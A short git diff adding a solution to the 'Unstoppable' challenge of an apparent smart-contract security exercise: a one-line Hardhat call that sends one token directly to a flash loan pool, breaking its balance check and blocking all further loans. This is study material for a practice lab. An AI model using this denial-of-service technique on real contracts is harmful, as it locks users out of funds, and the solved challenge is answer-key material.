@@ -40,6 +40,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // we transfert a token to the flash loan contract
+        // breaking assert(poolBalance == balanceBefore)
+        // Hence no more flash loand can be taken
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
